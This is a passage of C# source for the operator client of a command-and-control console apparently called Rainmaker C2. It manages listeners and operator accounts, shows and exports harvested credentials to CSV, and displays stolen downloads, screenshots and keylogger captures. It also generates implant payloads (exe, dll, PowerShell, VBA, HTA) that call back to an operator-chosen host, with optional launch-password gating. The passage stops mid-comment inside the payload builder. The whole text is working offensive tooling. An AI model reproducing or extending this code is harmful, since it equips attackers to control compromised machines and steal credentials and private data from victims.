                r.Type = el.Str("type");
                r.Proto = el.Str("proto");
                r.Host = el.Str("host");
                r.Port = el.Long("port");
                r.Uri = el.Str("uri");
                r.Ssl = el.Bool("ssl");
                r.Up = el.Bool("up");

                // id: 服务端当前可能还没给这个字段, 用 add 的回执 (按地址) 补上
                string addr = el.Str("addr");
                string id = ListenerParse.IdOf(el);
                if (id.Length == 0)
                {
                    string key = addr.Length > 0 ? addr : r.AddrText;
                    string memo;
                    if (_lsnIds.TryGetValue(key, out memo)) id = memo;
                }
                r.Id = id;

                // 服务端追加的保护字段 (listener_admin.go): 主入口 protected=true / manageable=false。
                // 字段缺失回 ManageUnknown, 由本地启发式兜底 —— 不把"没给"当成"允许删"。
                r.Protected = el.Bool("protected");
                r.ManageFlag = ListenerParse.ManageFlag(el);
                r.Addr = el.Str("addr");

                if (addr.Length > 0) seen.Add(addr);
                seen.Add(r.AddrText);                          // 服务端用 host:port 写法时也能对上
                list.Add(r);
            }

            // 轮询发现该 addr 已不在服务端列表里 (已被移除 / 服务端重启) -> 清掉本地记忆
            if (_lsnIds.Count > 0)
            {
                var stale = new List<string>();
                foreach (var kv in _lsnIds) if (!seen.Contains(kv.Key)) stale.Add(kv.Key);
                for (int i = 0; i < stale.Count; i++) _lsnIds.Remove(stale[i]);
            }
            return list;
        }

        /// <summary>仅刷新 UI (不做网络请求), 供轮询与 add/remove 后立即拉取共用。</summary>
        private void ApplyListeners(JsonElement root)
        {
            Sync(_listeners, ParseListeners(root));
            LsnCount.Text = _listeners.Count + " 个";
            LsnCount.ToolTip = ListenerSummary();
        }

        /// <summary>列表刷新后的文案: 主 listener 不可删这件事在计数里就说清。</summary>
        private string ListenerSummary()
        {
            int builtin = 0;
            for (int i = 0; i < _listeners.Count; i++) if (!_listeners[i].CanRemove) builtin++;
            return "监听器: " + _listeners.Count + " 个 (其中 " + builtin + " 个不可移除: 进程启动时的主 listener 或服务端未回传 id)";
        }

        private async void RefreshListeners_Click(object sender, RoutedEventArgs e)
        {
            await ReloadListenersAsync(false);
        }

        /// <summary>重拉监听器列表。quiet=true 时不改状态栏 (由调用方给出更具体的文案)。</summary>
        private async Task<bool> ReloadListenersAsync(bool quiet)
        {
            try
            {
                using (var doc = await _api.GetListenersAsync())
                {
                    ApplyListeners(doc.RootElement);
                    if (!quiet) SetStatus(ListenerSummary());
                    return true;
                }
            }
            catch (Exception ex)
            {
                SetStatus("监听器拉取失败: " + ex.Message);
                return false;
            }
        }

        /// <summary>
        /// ListenerDialog 的提交体 —— 对话框按钮与无人值守回归走**同一条**路径,
        /// 保证回归验证的就是操作员点击时执行的那段代码。
        /// 返回空串 = 成功; 非空 = 要原样显示在框内/状态栏的服务端 error。
        /// </summary>
        private async Task<string> SubmitListenerAsync(ListenerDialog d)
        {
            try
            {
                using (var doc = await _api.AddListenerAsync(d.KindValue, d.AddrValue))
                {
                    var op = ListenerParse.AddResult(doc.RootElement);
                    _lastOpText = op.Text;
                    SetStatus(FirstLine(op.Text));
                    if (!op.Ok) return op.Text;          // 服务端 error 原样 (含 HTTP 的拒绝理由)

                    // 记住回执: 服务端若还没在 listeners[] 里回 id, 用它把新建的那一行认回来。
                    // 键优先用服务端规范化后的实际地址 (端口 0 / 双栈绑定会与输入不同)。
                    string id = op.Id.Trim();
                    string memoKey = op.Addr.Trim().Length > 0 ? op.Addr.Trim() : d.AddrValue;
                    if (id.Length > 0) _lsnIds[memoKey] = id;
                    return "";
                }
            }
            catch (Exception ex) { return "请求失败: " + ex.Message; }
        }

        /// <summary>
        /// 新建 listener: **弹对话框**选类型 (HTTP / HTTPS / TCP / SMB / DNS / External C2) +
        /// 填地址, 确定后才 POST /api/listener/add。
        ///
        /// 类型与地址都在框里确认, 失败原因也回框里: 端口占用、绑定失败、
        /// HTTP(S) 的「运行期不支持新增 …」全部**原样**显示 (服务端 error 一字不改)。
        /// </summary>
        private async void AddListener_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new ListenerDialog("");
            dlg.Owner = this;
            dlg.Submit = SubmitListenerAsync;

            if (dlg.ShowDialog() != true) return;
            await ReloadListenersAsync(true);               // 立即反映创建结果
        }

        private async void ListenerRowStop_Click(object sender, RoutedEventArgs e)
        {
            var fe = sender as FrameworkElement;
            var row = fe == null ? null : fe.DataContext as ListenerRow;
            if (row != null) GridListeners.SelectedItem = row;
            await StopListenerAsync(row);
        }

        /// <summary>
        /// 停止 / 移除一个 listener: POST /api/listener/remove {id}。
        ///
        /// 主 listener (启动期注册的控制台入口) 的按钮已经置灰, 这里再兜一次:
        /// 万一走到这条路径, **不下发请求**, 也不伪造成功。
        /// 服务端回的 error (端口占用、主入口拒删、没有该 id) 一律原样显示。
        /// </summary>
        private async Task StopListenerAsync(ListenerRow row)
        {
            if (row == null) { SetStatus("请先在监听器表中选择一行"); return; }
            string id = (row.Id ?? "").Trim();
            if (id.Length == 0)
            {
                SetStatus(row.Name + " 没有 id 字段, 无法按 id 移除 —— 未下发 (id 由服务端在 listeners[] 里给出)");
                return;
            }
            if (!row.CanRemove)
            {
                SetStatus(ListenerParse.BlockedRemove(row.Name));
                return;
            }

            try
            {
                using (var doc = await _api.RemoveListenerAsync(id))
                {
                    var op = ListenerParse.RemoveResult(doc.RootElement);
                    SetStatus(FirstLine(op.Text));
                    if (op.Ok)
                    {
                        // 该 id 与地址的本地记忆一并作废, 免得列表里再拿旧 id 去删
                        var keys = new List<string>();
                        foreach (var kv in _lsnIds) if (kv.Value == id) keys.Add(kv.Key);
                        for (int i = 0; i < keys.Count; i++) _lsnIds.Remove(keys[i]);
                    }
                    await ReloadListenersAsync(true);
                }
            }
            catch (Exception ex)
            {
                SetStatus("移除 listener 失败: " + ex.Message);
            }
        }

        // ------------------------------------------------------------ 操作员账号

        private void InitAccountView()
        {
            AcctCount.Text = "0 个";
            GridUsers.ItemsSource = _users;
            ApplyAccountAccess();
        }

        /// <summary>
        /// 账号管理区的可用性 (三态, 见 AccountParse.Access)。
        /// token 的 role 明确是 operator 时整块置灰并写明原因 —— 不等撞 403 才报错;
        /// 未登录保持可用但如实标注 (服务端以 -auth=off 启动时无需认证即可管理)。
        /// </summary>
        private void ApplyAccountAccess()
        {
            var a = AccountParse.Access(_authRole);
            BtnAcctAdd.IsEnabled = a.CanManage;
            GridUsers.IsEnabled = a.CanManage;
            AcctHint.Text = a.Note;
            AcctHint.Foreground = (Brush)FindResource(a.CanManage ? "Dim" : "Warn");
        }

        private async void AcctRefresh_Click(object sender, RoutedEventArgs e)
        {
            await FetchUsersAsync(false);
        }

        /// <summary>
        /// 拉账号列表 (GET /api/users)。失败时把 401 未认证 / 403 需要管理员 /
        /// 404 服务端二进制过旧的文案原样显示, 并**清空表格** ——
        /// 宁可空表加一句真话, 也不留一份可能已经过期的账号列表。
        /// 不进 2 秒轮询: 它是显式操作对象 (进页面懒加载一次 + 刷新 + 增删改后重拉)。
        /// </summary>
        private async Task<bool> FetchUsersAsync(bool quiet)
        {
            string err = "";
            try
            {
                using (var doc = await _api.GetUsersAsync())
                {
                    Sync(_users, AccountParse.Users(doc.RootElement, _authUser));
                    _usersOnce = true;
                    AcctCount.Text = _users.Count + " 个";
                    AcctCount.ToolTip = UsersSummary();
                    if (!quiet) SetStatus(UsersSummary());
                    return true;
                }
            }
            catch (Exception ex) { err = ex.Message; }

            _users.Clear();
            AcctCount.Text = "0 个";
            AcctCount.ToolTip = "";
            SetStatus("账号列表拉取失败: " + err);
            return false;
        }

        private string UsersSummary()
        {
            int admins = 0;
            for (int i = 0; i < _users.Count; i++) if (_users[i].IsAdminRole) admins++;
            return "操作员账号: " + _users.Count + " 个 (admin " + admins + " 个); 来源 GET /api/users";
        }

        /// <summary>
        /// UserDialog(添加) 的提交体 —— 与对话框按钮共用同一条路径。
        /// 服务端的 error (用户已存在 / 口令至少 8 个字符 / 角色只能是 admin 或 operator)
        /// 原样返回给对话框显示。
        /// </summary>
        private async Task<string> SubmitAddUserAsync(UserDialog d)
        {
            try
            {
                using (var doc = await _api.AddUserAsync(d.UserValue, d.PasswordValue, d.RoleValue))
                {
                    var op = AccountParse.Result(doc.RootElement, "添加", d.UserValue, d.RoleValue);
                    _lastOpText = op.Text;
                    SetStatus(op.Text);
                    if (!op.Ok) return op.Error.Length > 0 ? op.Error : op.Text;
                    return "";
                }
            }
            catch (Exception ex) { return "请求失败: " + ex.Message; }
        }

        /// <summary>UserDialog(改口令) 的提交体 —— 与对话框按钮共用同一条路径。</summary>
        private async Task<string> SubmitPassAsync(OperatorRow row, UserDialog d)
        {
            try
            {
                using (var doc = await _api.SetUserPassAsync(row.User, d.PasswordValue))
                {
                    var op = AccountParse.Result(doc.RootElement, "改口令", row.User, row.Role);
                    _lastOpText = op.Text;
                    SetStatus(op.Text);
                    if (!op.Ok) return op.Error.Length > 0 ? op.Error : op.Text;
                    return "";
                }
            }
            catch (Exception ex) { return "请求失败: " + ex.Message; }
        }

        /// <summary>「添加账号」: 弹对话框 (用户名 + 角色下拉 + 口令 + 确认口令), 确定才下发。</summary>
        private async void AcctAdd_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new UserDialog("new", "");
            dlg.Owner = this;
            dlg.Submit = SubmitAddUserAsync;

            if (dlg.ShowDialog() != true) return;
            await FetchUsersAsync(true);
            if (_lastOpText.Length > 0) SetStatus(_lastOpText);
        }

        /// <summary>行内「改口令」: 用户名只读, 只填新口令 + 确认。</summary>
        private async void UserRowPass_Click(object sender, RoutedEventArgs e)
        {
            var row = RowFrom<OperatorRow>(sender);
            if (row == null) return;
            GridUsers.SelectedItem = row;

            var dlg = new UserDialog("pass", row.User);
            dlg.Owner = this;
            dlg.Submit = d => SubmitPassAsync(row, d);

            if (dlg.ShowDialog() != true) return;
            await FetchUsersAsync(true);
            if (_lastOpText.Length > 0) SetStatus(_lastOpText);
        }

        /// <summary>
        /// 行内「删除」: 二次确认后 POST /api/user/delete。
        /// 服务端拒绝删自己 / 删最后一个 admin 时, 那句 error **原样**进状态栏。
        /// 按钮在本地已按同一规则置灰 (ToolTip 里写着服务端会回什么)。
        /// </summary>
        private async void UserRowDelete_Click(object sender, RoutedEventArgs e)
        {
            var row = RowFrom<OperatorRow>(sender);
            if (row == null) return;
            GridUsers.SelectedItem = row;

            if (!row.CanDelete) { SetStatus(row.DeleteHint); return; }   // 兜底: 按钮已置灰时也不冒烟

            var ans = MessageBox.Show(this, AccountParse.DeleteConfirm(row.User, row.Role),
                                      "Rainmaker C2 控制台", MessageBoxButton.OKCancel, MessageBoxImage.Warning);
            if (ans != MessageBoxResult.OK) return;

            try
            {
                using (var doc = await _api.DeleteUserAsync(row.User))
                {
                    var op = AccountParse.Result(doc.RootElement, "删除", row.User, row.Role);
                    SetStatus(op.Text);
                }
            }
            catch (Exception ex) { SetStatus("删除账号失败: " + ex.Message); }
            await FetchUsersAsync(true);
        }

        /// <summary>行内按钮 → 它所在行的行对象 (DataGrid 按钮不依赖选中态)。</summary>
        private static T RowFrom<T>(object sender) where T : class
        {
            var fe = sender as FrameworkElement;
            return fe == null ? null : fe.DataContext as T;
        }

        private void CopyPass_Click(object sender, RoutedEventArgs e)
        {
            var row = GridCreds.SelectedItem as CredRow;
            if (row == null) { SetStatus("请先在凭据表选择一行"); return; }
            CopyToClipboard(row.Secret, "密码");
        }

        private void GridCreds_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = GridCreds.SelectedItem as CredRow;
            if (row == null) return;
            CopyToClipboard(row.User + "  " + row.Secret, "凭据 (user + secret)");
        }

        private void ExportCsv_Click(object sender, RoutedEventArgs e)
        {
            if (_creds.Count == 0) { SetStatus("凭据库为空, 无可导出内容"); return; }
            try
            {
                var dlg = new Microsoft.Win32.SaveFileDialog();
                dlg.Title = "导出凭据 CSV";
                dlg.Filter = "CSV 文件 (*.csv)|*.csv|全部文件 (*.*)|*.*";
                dlg.FileName = "csdev_credentials_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".csv";
                if (dlg.ShowDialog(this) != true) return;

                var sb = new StringBuilder();
                sb.Append("user,secret,source,sid,ts\r\n");
                foreach (var c in _creds)
                {
                    sb.Append(Csv(c.User)).Append(',')
                      .Append(Csv(c.Secret)).Append(',')
                      .Append(Csv(c.Source)).Append(',')
                      .Append(Csv(c.Sid)).Append(',')
                      .Append(Csv(c.TsText)).Append("\r\n");
                }
                // 带 BOM, Excel 直接双击不乱码
                File.WriteAllText(dlg.FileName, sb.ToString(), new UTF8Encoding(true));
                SetStatus("已导出 " + _creds.Count + " 条凭据: " + dlg.FileName);
            }
            catch (Exception ex)
            {
                SetStatus("导出失败: " + ex.Message);
            }
        }

        private static string Csv(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            bool needQuote = s.IndexOf(',') >= 0 || s.IndexOf('"') >= 0 || s.IndexOf('\n') >= 0 || s.IndexOf('\r') >= 0;
            string v = s.Replace("\"", "\"\"");
            return needQuote ? "\"" + v + "\"" : v;
        }

        private async void RefreshDownloads_Click(object sender, RoutedEventArgs e)
        {
            await PollAsync();
            SetStatus("下载列表已刷新: " + _downloads.Count + " 项");
        }

        private void OpenDownload_Click(object sender, RoutedEventArgs e)
        {
            var row = GridDownloads.SelectedItem as DownloadRow;
            if (row == null) { SetStatus("请先在下载表选择一行"); return; }
            OpenWithShell(row.Path, "open");
        }

        private void OpenDownloadDir_Click(object sender, RoutedEventArgs e)
        {
            var row = GridDownloads.SelectedItem as DownloadRow;
            if (row == null) { SetStatus("请先在下载表选择一行"); return; }
            OpenWithShell(row.Path, "reveal");
        }

        private void GridDownloads_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = GridDownloads.SelectedItem as DownloadRow;
            if (row == null) return;
            OpenWithShell(row.Path, "open");
        }

        // ------------------------------------------------------------ 下载文件内容查看

        /// <summary>
        /// 「查看内容」: GET /api/download/file?id=&lt;记录号&gt; 取回已下载文件的字节, 交给
        /// 解析层判定文本 / 二进制, 再用只读窗口显示 —— **本地的落盘文件不读**, 走服务端
        /// 记录是为了和 /api/downloads 的清单一致 (本地路径可能被手工挪走)。
        ///
        /// 二进制不假装能显示: DownloadParse 会给出大小 + 判定依据 + 前 256 字节十六进制 + 全量转储。
        /// </summary>
        private async void ViewDownload_Click(object sender, RoutedEventArgs e)
        {
            var row = GridDownloads.SelectedItem as DownloadRow;
            if (row == null) { SetStatus("请先在下载表选择一行"); return; }

            SetStatus("正在取回下载内容: #" + row.Id + " " + row.Name + " ...");
            try
            {
                byte[] bytes = await _api.GetDownloadFileAsync(row.Id);
                var dc = DownloadContent.Parse(bytes);
                ShowTextWindow(dc.TitleText(row.Name), dc.TextBody());
                SetStatus("下载内容 #" + row.Id + " " + row.Name + ": " + dc.SizeText
                        + (dc.IsBinary ? "  [二进制, 已给十六进制]" : "  [文本]")
                        + "  判定: " + dc.RatioText());
            }
            catch (Exception ex)
            {
                SetStatus(DownloadContent.ErrorText(row.Name, ProbableHttpCode(ex), ex.Message));
            }
        }

        /// <summary>
        /// 从异常文案里取 HTTP 状态码 (CsdevApi 的失败文案形如 "HTTP 404  |  404 page not found")。
        /// 取不到返回 0 —— 调用方按"非 HTTP 失败"处理, 不猜。
        /// </summary>
        private static int ProbableHttpCode(Exception ex)
        {
            string m = ex == null ? "" : ex.Message;
            int i = m.IndexOf("HTTP ", StringComparison.Ordinal);
            if (i < 0) return 0;
            int n = 0;
            for (int k = i + 5; k < m.Length && char.IsDigit(m[k]); k++) n = n * 10 + (m[k] - '0');
            return n;
        }

        // ------------------------------------------------------------ 报告导出

        /// <summary>
        /// 服务端页「报告导出」区初始化: CSV 类型下拉 + 说明。
        ///
        /// 与账号区同一条约定: **不进 2 秒轮询** —— 导出是显式操作的对象, 每次点击才发一次请求。
        /// </summary>
        private void InitReportView()
        {
            ReportKindBox.ItemsSource = ReportParse.Kinds;
            ReportKindBox.SelectedIndex = 0;   // 服务端缺 kind 时也按 sessions 处理, 这里显式选上
            ReportHint.Text = "三个端点都回文件流: JSON/HTML 是整份快照, CSV 带 UTF-8 BOM (保存时原样写字节, 不做编码转换)。"
                            + "端点需 Bearer 令牌 —— 未登录会提示『需要登录』。";
            ReportHint.ToolTip = ReportHint.Text;
        }

        private async void ExportReportJson_Click(object sender, RoutedEventArgs e)
        {
            await ExportReportAsync("JSON 报告", ReportParse.JsonUrl, "json", "json", "全量活动快照 (JSON)");
        }

        private async void ExportReportHtml_Click(object sender, RoutedEventArgs e)
        {
            await ExportReportAsync("HTML 报告", ReportParse.HtmlUrl, "html", "html", "自包含单文件 HTML 报告 (内嵌 CSS)");
        }

        private async void ExportReportCsv_Click(object sender, RoutedEventArgs e)
        {
            var kind = ReportKindBox.SelectedItem as ReportExport;
            string k = kind != null ? kind.Kind : "sessions";
            await ExportReportAsync("CSV 报告 (" + k + ")", ReportParse.CsvUrl(k), "csv", k,
                                    "分类 CSV 导出, kind=" + k + " (服务端带 UTF-8 BOM)");
        }

        /// <summary>
        /// 导出并落盘。**先取字节再弹保存框** —— 反过来的话取消保存会白拉一次流量, 且
        /// 错误要等用户选完文件才出现。
        ///
        /// 落盘用 <c>File.WriteAllBytes</c>: 服务端回的就是最终字节 (CSV 的 BOM 在其中),
        /// 不做任何编码转换 —— 一次 U+FEFF 往返就能让 Excel 认不出中文。
        /// </summary>
        private async Task ExportReportAsync(string what, string url, string ext, string kind, string desc)
        {
            SetStatus("正在下载" + what + " ...  " + url);
            byte[] bytes;
            try
            {
                if (ext == "json") bytes = await _api.GetReportJsonAsync();
                else if (ext == "html") bytes = await _api.GetReportHtmlAsync();
                else bytes = await _api.GetReportCsvAsync(kind);
            }
            catch (Exception ex)
            {
                SetStatus(what + "下载失败: " + ex.Message);
                return;
            }

            string path = url;
            int q = path.IndexOf('?');
            if (q >= 0) path = path.Substring(0, q);
            if (bytes == null || bytes.Length == 0)
            {
                string t = ReportParse.SaveErrorText(what, 0, "服务端返回 0 字节", path);
                SetStatus(t);
                ReportHint.Text = t;
                return;
            }

            try
            {
                var dlg = new Microsoft.Win32.SaveFileDialog();
                dlg.Title = "保存" + what;
                dlg.Filter = ReportFilter(ext);
                dlg.FileName = ReportParse.FileName(kind, ext, DateTime.Now);
                if (dlg.ShowDialog(this) != true) { SetStatus("已取消: " + what); return; }

                File.WriteAllBytes(dlg.FileName, bytes);
                string full = Path.GetFullPath(dlg.FileName);
                SetStatus(ReportParse.SavedText(full, bytes.Length) + "  [" + desc + "]");
                ReportHint.Text = "最近导出: " + full + "   " + ReportParse.BytesText(bytes.Length) + "   " + desc;
                ReportHint.ToolTip = ReportHint.Text;
            }
            catch (Exception ex)
            {
                SetStatus("保存" + what + "失败: " + ex.Message);
            }
        }

        private static string ReportFilter(string ext)
        {
            string e = (ext ?? "").TrimStart('.');
            if (e == "json") return "JSON 文件 (*.json)|*.json|全部文件 (*.*)|*.*";
            if (e == "html") return "HTML 文件 (*.html)|*.html|全部文件 (*.*)|*.*";
            return "CSV 文件 (*.csv)|*.csv|全部文件 (*.*)|*.*";
        }

        private async void CtxCheckin_Click(object sender, RoutedEventArgs e)
        {
            var row = GridSessions.SelectedItem as SessionRow;
            if (row == null) { SetStatus(SessionParse.NoSessionText); return; }

            // v1 会话服务端恒回 ok=false, 本地先拦: 少一次往返, 也少一条会误导人的"失败"日志
            if (!row.IsV2)
            {
                SetStatus(SessionParse.CheckinV1Hint + " (会话 " + row.Sid + " protocol=" + row.Proto + ")");
                return;
            }

            SetStatus("正在催心跳: " + row.Sid + " ...");
            try
            {
                using (var doc = await _api.CheckinAsync(row.Sid))
                {
                    var op = SessionParse.FromJson(doc.RootElement, row.Sid);
                    SetStatus(op.Text);
                }
            }
            catch (Exception ex)
            {
                var op = SessionParse.FromException(row.Sid, ex);
                SetStatus(op.Text);
            }
        }

        // ------------------------------------------------------------ 截屏

        private async void PrefetchScreenshots()
        {
            foreach (var shot in _shots)
            {
                if (shot.Thumb != null) continue;
                if (_shotFailed.Contains(shot.Id)) continue;

                BitmapImage bmp;
                if (_shotCache.TryGetValue(shot.Id, out bmp)) { shot.Thumb = bmp; continue; }

                try
                {
                    // 服务端只回传 id, 图片按 id 走 /api/screenshot/file
                    byte[] bytes = await _api.GetBytesAsync("/api/screenshot/file?id=" + shot.Id);
                    bmp = MakeBitmap(bytes);
                    _shotCache[shot.Id] = bmp;
                    shot.Thumb = bmp;
                }
                catch (Exception ex)
                {
                    _shotFailed.Add(shot.Id);
                    SetStatus("截屏 #" + shot.Id + " 加载失败: " + ex.Message);
                }
            }
        }

        private void ListShots_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            var row = ListShots.SelectedItem as ShotRow;
            if (row == null) return;
            ShotPreview.Source = row.Thumb;
            ShotInfo.Text = "#" + row.Id + "  " + row.Sid + "  " + row.SizeText + "  " + row.TsText;
        }

        private async void RefreshShots_Click(object sender, RoutedEventArgs e)
        {
            _shotFailed.Clear();
            await PollAsync();
            PrefetchScreenshots();
            SetStatus("截屏列表已刷新: " + _shots.Count + " 张");
        }

        private void OpenShot_Click(object sender, RoutedEventArgs e)
        {
            var row = ListShots.SelectedItem as ShotRow;
            if (row == null) { SetStatus("请先选择一张截屏"); return; }
            OpenWithShell(row.Path, "open");
        }

        // ------------------------------------------------------------ 键盘记录 / 事件

        private void GridKeylogs_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var row = GridKeylogs.SelectedItem as KeylogRow;
            if (row == null) return;
            CopyToClipboard(row.Text, "键盘记录内容");
        }

        private async void RefreshEvents_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                using (var doc = await _api.GetEventlogAsync(300))
                {
                    var list = new List<EventRow>();
                    foreach (var el in doc.RootElement.Arr("events"))
                    {
                        var r = new EventRow();
                        r.Id = el.Long("id");
                        r.Cat = el.Str("cat");
                        r.Sid = el.Str("sid");
                        r.Action = el.Str("action");
                        r.Detail = el.Str("detail");
                        r.Who = el.Str("who");
                        r.Ts = el.Long("ts");
                        list.Add(r);
                    }
                    Sync(_events, list);
                    SetStatus("事件日志已刷新: " + _events.Count + " 条");
                }
            }
            catch (Exception ex)
            {
                SetStatus("事件日志拉取失败: " + ex.Message);
            }
        }

        // ------------------------------------------------------------ 载荷生成

        private async Task LoadFormatsAsync(bool quiet)
        {
            try
            {
                using (var doc = await _api.GetFormatsAsync())
                {
                    var list = new List<PayloadFormat>();
                    foreach (var el in doc.RootElement.Arr("formats"))
                    {
                        list.Add(new PayloadFormat
                        {
                            Id = el.Str("id"),
                            Desc = el.Str("desc"),
                            Kind = el.Str("kind"),
                            Proto = el.Str("proto")
                        });
                    }
                    if (list.Count == 0)
                    {
                        GenLine("[!] 服务端 /api/payload/formats 返回空列表");
                        return;
                    }
                    _formats.Clear();
                    foreach (var f in list) _formats.Add(f);
                    FmtBox.SelectedIndex = 0;
                    GenLine("[*] 已加载 " + _formats.Count + " 种载荷格式");
                    if (!quiet) SetStatus("载荷格式已刷新: " + _formats.Count + " 种");
                }
            }
            catch (Exception ex)
            {
                GenLine("[!] 载荷格式拉取失败: " + ex.Message);
                if (!quiet) SetStatus("载荷格式拉取失败: " + ex.Message);
            }
        }

        private async void LoadFormats_Click(object sender, RoutedEventArgs e)
        {
            await LoadFormatsAsync(false);
        }

        /// <summary>
        /// 生成日志的一行。
        ///
        /// 口令相关: 生成器把随机盐 + 摘要编进样本, 明文只存在于本次请求里;
        /// 服务端脚本的失败消息可能带口令原文 (例如"口令不能含空白字符: xxx"),
        /// 服务端会把 CombinedOutput 原样回传 —— 所以写日志前统一过 RedactPassword,
        /// 并把口令**不进状态栏**这条规则写死在这里 (状态栏是长时间可见的最显眼位置)。
        /// </summary>
        private static string MaskPwd(string text, string password)
        {
            return PayloadRequest.RedactPassword(text, password);
        }

        /// <summary>生成日志追加一行 (就绪提示不残留)。</summary>
        private void GenLine(string line)
        {
            if (string.IsNullOrEmpty(line)) return;
            if (GenLog.Text == "就绪") GenLog.Clear();
            GenLog.AppendText(line + "\n");
            GenLog.ScrollToEnd();
        }

        /// <summary>
        /// 启动口令输入框的实时提示。
        ///
        /// 只显示"是否启用 + 字符数 + 本地校验结论", **不显示口令本身**, 也不进状态栏。
        /// 启用后把运行时用法写在提示里 (与生成成功日志里那段 [口令门控] 一致)。
        /// </summary>
        private void PwdBox_PasswordChanged(object sender, RoutedEventArgs e)
        {
            ApplyPasswordHint();
        }

        private void ApplyPasswordHint()
        {
            string pw = PwdBox.Password ?? "";
            if (PwdHint == null) return;

            if (pw.Length == 0)
            {
                PwdHint.Text = "当前: 未启用启动口令门控 (口令留空 = 不加门控, 生成出来的样本直接运行)。"
                             + "填入口令则启用门控: 运行时用 <样本> <口令> 或环境变量 CSDEV_TOKEN 启动。"
                             + "口令不回显在状态栏/日志, 也不写入任何配置或最近使用记录。";
                PwdHint.ClearValue(TextBlock.ForegroundProperty);
                return;
            }

            string problem = PayloadRequest.PasswordProblem(pw);
            if (problem.Length > 0)
            {
                PwdHint.Text = "当前: 口令未通过本地校验 (不会提交服务端) —— " + problem
                             + "。口令不回显、不落盘。";
                PwdHint.Foreground = Palette.Warn;
                return;
            }

            PwdHint.Text = "当前: 已启用启动口令门控 (" + pw.Length + " 个字符, 明文不回显)。"
                         + "运行时用法: <样本> <口令>, 或设环境变量 CSDEV_TOKEN=<口令>。"
                         + "生成成功日志里会有 [口令门控] 已启用那两行。"
                         + "口令不回显在状态栏/日志, 也不写入任何配置或最近使用记录。";
            PwdHint.ClearValue(TextBlock.ForegroundProperty);
        }

        private async void Generate_Click(object sender, RoutedEventArgs e)
        {
            var fmt = FmtBox.SelectedItem as PayloadFormat;
            if (fmt == null)
            {
                SetStatus("请先选择载荷格式 (列表来自 GET /api/payload/formats)");
                return;
            }
            string host = HostBox.Text.Trim();
            if (host.Length == 0)
            {
                SetStatus("请填写 C2 地址");
                return;
            }

            long port = ParseLong(PortBox.Text, 8443);
            if (port <= 0 || port > 65535) port = 8443;
            long sleep = ParseLong(SleepBox.Text, 0);
            long jitter = ParseLong(JitterBox.Text, 10);
            bool ssl = SslBox.IsChecked == true;

            string outFile = OutBox.Text.Trim();
            if (outFile.Length > 0)
            {
                try { outFile = Path.ChangeExtension(outFile, fmt.Ext); } catch { }
                OutBox.Text = outFile;
            }

            // 启动口令 (可空): 留空 = 不加门控。校验在本地做, 不让明文口令去撞服务端
            // (生成器的 throw 消息里带着口令原文, 那会被服务端原样回传并落进日志)。
            string pwd = PwdBox.Password ?? "";
            string pwdProblem = PayloadRequest.PasswordProblem(pwd);
            if (pwdProblem.Length > 0)
            {
                GenLog.Clear();
                GenLine("[!] 口令未通过本地校验, 未提交服务端: " + pwdProblem);
                SetStatus("启动口令不合法 (未提交): " + pwdProblem);
                return;
            }
            bool gate = pwd.Length > 0;

            BtnBuild.IsEnabled = false;
            GenLog.Clear();
            GenLine("格式    : " + fmt.Id + "   (" + fmt.Proto + " / " + fmt.Kind + ")");
            GenLine("回连    : " + (ssl ? "https" : "http") + "://" + host + ":" + port);
            GenLine("sleep   : " + sleep + " ms  jitter " + jitter + " %");
            GenLine("输出    : " + (outFile.Length > 0 ? outFile : "(服务端决定)"));
            // 只写"是否启用", 不写口令本身
            GenLine("门控    : " + (gate ? "启用启动口令 (" + pwd.Length + " 字符, 明文不回显)" : "未启用 (口令留空)"));
            GenLine("");
            SetStatus(gate ? "正在生成载荷 " + fmt.Id + " (启用启动口令门控) ..."
                           : "正在生成载荷 " + fmt.Id + " ...");

            try
            {
                bool ok = await BuildOnceAsync(fmt.Id, host, port, ssl, outFile, sleep, jitter, false, pwd);
                if (!ok) SetStatus("生成失败, 详见生成日志");
            }
            catch (Exception ex)
            {
                GenLine("[!] 请求异常: " + MaskPwd(ex.Message, pwd));
                SetStatus("生成请求异常: " + MaskPwd(ex.Message, pwd));
            }
            finally
            {
                BtnBuild.IsEnabled = true;
            }
        }

        /// <summary>
        /// 单次生成请求。
        ///
        /// noSleep=true 时不带 sleep/jitter (服务端生成脚本可能未声明这两个参数);
        /// password 非空时带上 password 字段 = 启用启动口令门控 (留空则键都不出现)。
        /// 服务端回传的 log **逐行原样**进生成日志 —— 其中就包括黄色那段
        /// [口令门控] 已启用 (附带运行时用法), 一次都不吞; 只在写日志前把口令明文掩掉。
        /// </summary>
        private async Task<bool> BuildOnceAsync(string fmt, string host, long port, bool ssl,
                                                string outFile, long sleep, long jitter, bool noSleep,
                                                string password)
        {
            // 客户端本地生成: 原生格式(win2-exe/console/svc/dll/raw/tcp)直接在客户端
            // 解密模板 + 覆写配置槽, 完全不走服务端、也不需要 gcc / PowerShell。
            if (NativeGenerator.Supports(fmt))
            {
                byte[] pubkey = await FetchServerPubkeyAsync();
                return GenerateNativeLocally(fmt, host, port, ssl, outFile, sleep, jitter, password, pubkey);
            }

            // 脚本类格式 (ps1/vba/vbs/cs/hta) 同样客户端本地生成, 载体用原生模板。
            if (ScriptGenerator.Supports(fmt))
            {
                byte[] pubkey = await FetchServerPubkeyAsync();
                return GenerateScriptLocally(fmt, host, port, ssl, outFile, sleep, jitter, password, pubkey);
            }

            // 请求体由 PayloadRequest.Build 构造 (纯函数, 字段名/省略规则有自测钉住)
            var body = PayloadRequest.Build(fmt, host, port, ssl, outFile, sleep, jitter, noSleep, password);
            using (var doc = await _api.BuildPayloadAsync(body))
            {
                var root = doc.RootElement;
                bool ok = root.Bool("ok");
                string log = root.Str("log");
                string err = root.Str("error");

                // 产物随响应回传 (data_b64) —— 落到**本机**。
                //
                // 为什么必须这样: 服务端常常跑在远程 VPS 上, 它写自己的磁盘等于产物留在
                // 那台机器。更糟的是客户端填的 Windows 路径到了 Linux 服务端会被当成
                // **单个文件名** (反斜杠不是 Linux 的分隔符), 产物变成一个名字里带反斜杠
